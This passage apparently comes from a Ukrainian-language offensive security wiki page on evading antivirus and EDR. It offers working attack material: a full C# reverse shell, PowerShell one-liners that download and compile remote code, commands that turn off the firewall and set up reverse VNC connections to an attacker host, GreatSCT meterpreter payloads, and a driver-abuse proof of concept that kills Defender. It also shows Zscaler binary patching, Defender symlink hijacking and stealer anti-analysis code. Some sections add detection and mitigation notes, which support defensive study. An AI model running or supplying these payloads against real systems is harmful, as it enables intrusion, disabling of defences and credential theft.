Це передбачає **створення нового «жертвенного» процесу**, ін'єкцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду, а після завершення — завершення нового процесу. Це має свої переваги і недоліки. Перевага методу fork and run у тому, що виконання відбувається **поза** процесом нашого Beacon-імпланта. Це означає, що якщо щось у нашій post-exploitation дії піде не так або буде виявлено, існує **набагато більша ймовірність** виживання нашого **імпланта.** Недоліком є те, що ви маєте **більшу ймовірність** бути поміченим через **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це ін'єкція post-exploitation шкідливого коду **в власний процес**. Таким чином можна уникнути створення нового процесу і його сканування AV, але недолік у тому, що якщо щось піде не так під час виконання вашого payload, існує **набагато більша ймовірність** **втрати вашого beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про C# Assembly loading, ознайомтеся з цією статтею [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхнім InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **з PowerShell**, подивіться [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як пропонується в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надаючи скомпрометованій машині доступ до середовища інтерпретатора, встановленого на Attacker Controlled SMB share.

Надаючи доступ до Interpreter Binaries та середовища на SMB share, ви можете **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

У репозиторії вказано: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми отримуємо **більшу гнучкість у обході static signatures**. Тестування з випадковими необфускованими reverse shell скриптами цими мовами виявилося успішним.

## TokenStomping

Token stomping — це техніка, яка дозволяє нападникові **маніпулювати токеном доступу або продуктом безпеки, таким як EDR чи AV**, зменшуючи його привілеї так, щоб процес не завершився, але не мав дозволів для перевірки шкідливої активності.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко просто розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його для takeover та підтримки persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Запустіть інсталятор безшумно на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер попросить авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте наведений параметр з деякими корективами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити PIN без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви маєте справу, матиме свої сильні та слабкі сторони.

Раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також ще одна відмінна доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі методи**

### **Перевірте, які частини Defender вважає шкідливими**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **буде видаляти частини бінарника** доти, поки **не визначить, яку частину Defender** вважає шкідливою та не розбере її для вас.\
Ще один інструмент, що робить **те саме** — [**avred**](https://github.com/dobin/avred) з відкритим веб-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Налаштуйте його так, щоб воно **запускалося** при завантаженні системи, і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) і відключити firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажити з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin-завантаження, не setup)

**ON THE HOST**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарник _**winvnc.exe**_ та **новостворений** файл _**UltraVNC.ini**_ всередину **victim**

#### **Reverse connection**

**attacker** повинен **виконати всередині** свого **host** бінарник `vncviewer.exe -listen 5900`, щоб він був **підготовлений** прийняти зворотне **VNC connection**. Потім, всередині **victim**: запустіть демон `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти прихованість, не робіть наступного

- Не запускайте `winvnc`, якщо він вже запущений, інакше ви викличете [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` в тій же теці, інакше це відкриє [the config window](https://i.imgur.com/rfMQWcf.png)
- Не виконуйте `winvnc -h` для довідки, інакше ви викличете [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажити з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компілювання нашого власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# (з використанням компілятора)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список obfuscators для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Вимкнення AV/EDR з простору ядра

Storm-2603 використав невелику консольну утиліту, відому як **Antivirus Terminator**, щоб відключити endpoint-захист перед розгортанням ransomware. Інструмент приносить свій **власний вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій в ядрі, які навіть служби Protected-Process-Light (PPL) AV не можуть заблокувати.

Ключові висновки
1. **Signed driver**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — це легітимно підписаний драйвер `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли увімкнено Driver-Signature-Enforcement (DSE).
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, тож `\\.\ServiceMouse` стає доступним з user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити будь-який процес за PID (використовується для вбивства Defender/EDR служб) |
| `0x990000D0` | Видалити будь-який файл на диску |
| `0x990001D0` | Видружити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD повністю обходить захист у user-mode; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або змінювати об’єкти ядра незалежно від PPL/PP, ELAM чи інших механізмів жорсткого захисту.

Detection / Mitigation
•  Увімкніть Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.  
•  Моніторте створення нових *kernel* сервісів і генеруйте сповіщення, коли драйвер завантажується з каталогу з дозволом запису для всіх або не присутній у allow-list.  
•  Слідкуйте за user-mode handle'ами до кастомних device objects, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує device-posture правила локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі дизайнерські рішення роблять можливим повний обхід:

1. Оцінка posture відбувається **повністю на клієнті** (серверу відсилається булеве значення).  
2. Внутрішні RPC endpoint'и лише перевіряють, що виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Патчингом чотирьох підписаних бінарників на диску можна нейтралізувати обидва механізми:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть непідписаний) процес може прив'язатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Перервано (short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стека сервісів:

* **Усі** перевірки безпеки показують **зелений/відповідний**.
* Непідписані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як чисто клієнтські рішення довіри та прості перевірки підпису можуть бути обійдені кількома байт-патчами.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) реалізує ієрархію підписувач/рівень, тож лише процеси з рівнем не нижчим можуть втручатися один в одного. Зловмисно: якщо ви легітимно запускаєте бінар з підтримкою PPL і контролюєте його аргументи, ви можете перетворити добросовісну функціональність (наприклад, логування) на обмежений примітив запису, підкріплений PPL, проти захищених директорій, що використовуються AV/EDR.

What makes a process run as PPL
- Цільовий EXE (та будь-які завантажені DLL) мають бути підписані EKU, що підтримує PPL.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запрошений сумісний рівень захисту, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware підписувачів, `PROTECTION_LEVEL_WINDOWS` для Windows-підписувачів). Невірні рівні призведуть до помилки при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Відкритий інструмент: CreateProcessAsPPL (обирає рівень захисту і передає аргументи цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Приклад використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN примітив: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог-файлу у шлях, вказаний викликом.
- Якщо запущено як процес PPL, запис файлу відбувається з підтримкою PPL.
- ClipUp не може розпарсити шляхи, що містять пробіли; використовуйте 8.3 скорочені шляхи, щоб вказувати в зазвичай захищені місця.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-сумісний LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху лог-файлу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте 8.3 скорочені імена.
3) Якщо цільовий бінарний файл зазвичай відкритий/заблокований AV під час виконання (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до того, як AV стартує, встановивши службу автозапуску, яка надійно запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис з підтримкою PPL відбувається до того, як AV заблокує свої бінарні файли, пошкоджуючи цільовий файл і не даючи йому запуститись.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розміщення; примітив більше підходить для корупції ніж для точної ін’єкції контенту.
- Потребує local admin/SYSTEM для інсталяції/запуску сервісу та вікна для перезавантаження.
- Часування критичне: ціль не повинна бути відкрита; виконання під час завантаження обходить блокування файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо коли батьківським процесом є нестандартний лаунчер, під час завантаження.
- Нові сервіси, сконфігуровані для автостарту підозрілих бінарників й які послідовно запускаються до Defender/AV. Розслідуйте створення/зміну сервісів перед помилками старту Defender.
- Моніторинг цілісності файлів у Defender binaries/Platform директоріях; несподівані створення/зміни файлів процесами з protected-process прапорцями.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL не-AV бінарниками.

Mitigations
- WDAC/Code Integrity: обмежте, які підписані бінарники можуть працювати як PPL і під якими батьками; заблокуйте виклики ClipUp поза легітимними контекстами.
- Service hygiene: обмежте створення/зміну авто-стартап сервісів і моніторьте маніпуляції порядком запуску.
- Переконайтесь, що Defender tamper protection та early-launch protections увімкнені; розслідуйте помилки старту, що вказують на корупцію бінарників.
- Розгляньте вимкнення генерації 8.3 short-name на томах, де розміщене security tooling, якщо це сумісно з вашим середовищем (ретельно тестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender блокує записи у власних папках, але його вибір платформи довіряє записам директорій і обирає лексикографічно найвищу версію без перевірки, що ціль резольвиться в захищений/довірений шлях.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink директорії вищої версії всередині Platform, який вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні побачити новий шлях процесу під `C:\TMP\AV\` та конфігурацію/реєстр служби, що відображає це розташування.

Post-exploitation options
- DLL sideloading/code execution: Розмістити/замінити DLL, які Defender завантажує з його каталогу програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видалити version-symlink, щоб при наступному запуску налаштований шлях не розв'язувався і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує privilege escalation; вона вимагає admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перемістити ухилення під час виконання (runtime evasion) з C2 implant у сам цільовий модуль, хукнувши його Import Address Table (IAT) і направивши вибрані APIs через attacker-controlled, position‑independent code (PIC). Це поширює evasion далі за невелику поверхню API, яку багато kit'ів експонують (наприклад, CreateProcessA), і надає ті самі захисти BOFs та post‑exploitation DLLs.

High-level approach
- Розмістити PIC blob поруч із цільовим модулем за допомогою reflective loader (prepended або companion). PIC має бути самодостатнім і position‑independent.
- Коли host DLL завантажується, пройти по його IMAGE_IMPORT_DESCRIPTOR і пропатчити IAT entries для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasions перед tail‑calling реальної адреси API. Типові evasions включають:
  - Memory mask/unmask навколо виклику (наприклад, encrypt beacon regions, RWX→RX, змінити імена/дозволи сторінок), потім відновити після виклику.
  - Call‑stack spoofing: побудувати benign stack і перейти до цільового API так, щоб call‑stack analysis показав очікувані фрейми.
  - Для сумісності export-уйте інтерфейс, щоб Aggressor script (або еквівалент) міг зареєструвати, які APIs хукати для Beacon, BOFs та post‑ex DLLs.

Why IAT hooking here
- Працює для будь‑якого коду, що використовує запатчений import, без модифікації tool code або залежності від Beacon для проксингу конкретних APIs.
- Покриває post‑ex DLLs: hooking LoadLibrary* дозволяє перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ті ж masking/stack evasion до їхніх викликів API.
- Відновлює надійне використання process‑spawning post‑ex команд проти виявлень, що базуються на call‑stack, шляхом обгортання CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Застосовуйте патч після relocations/ASLR і перед першим використанням імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Тримайте wrappers маленькими й PIC‑безпечними; отримуйте справжній API через оригінальне значення IAT, яке ви зняли до патчінгу, або через LdrGetProcedureAddress.
- Використовуйте RW → RX переходи для PIC і уникайте залишати writable+executable сторінки.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фальшивий ланцюжок викликів (адреси повернення у benign модулях) і потім переключаються на реальний API.
- Це обходить детекції, що очікують канонічні стеки від Beacon/BOFs до чутливих API.
- Поєднуйте з техніками stack cutting/stack stitching, щоб опинитися всередині очікуваних фреймів до прологу API.

Operational integration
- Додавайте reflective loader перед post‑ex DLL, щоб PIC і hooks ініціалізувалися автоматично при завантаженні DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро користувалися тим самим шляхом ухилення без змін коду.

Detection/DFIR considerations
- IAT integrity: записи, що резольвляться в non‑image (heap/anon) адреси; періодична верифікація import pointers.
- Аномалії стека: адреси повернення, які не належать завантаженим образам; різкі переходи до non‑image PIC; неконсистентне RtlUserThreadStart ancestry.
- Loader telemetry: in‑process записи в IAT, рання DllMain активність, що модифікує import thunks, незаплановані RX регіони, створені під час завантаження.
- Image‑load evasion: якщо хукати LoadLibrary*, моніторте підозрілі завантаження automation/clr assemblies у кореляції з memory masking подіями.

Related building blocks and examples
- Reflective loaders, що виконують IAT patching під час load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) і stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ілюструє, як сучасні info‑stealers поєднують AV bypass, anti‑analysis і credential access в одному workflow.

### Keyboard layout gating & sandbox delay

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури через `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює пустий маркер `CIS` і завершує роботу перед запуском stealers, гарантуючи, що він ніколи не детонує в виключених локалях, залишаючи артефакт для пошуку.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева `check_antivm` логіка

- Variant A перебирає список процесів, хешує кожне ім'я власним ролінговим checksum і порівнює його з вбудованими blocklists для debuggers/sandboxes; повторює checksum по імені комп'ютера і перевіряє робочі теки, такі як `C:\analysis`.
- Variant B інспектує властивості системи (process-count floor, recent uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleeps, щоб виявити single-stepping. У разі виявлення виконання переривається до запуску модулів.

### Fileless helper + double ChaCha20 reflective loading

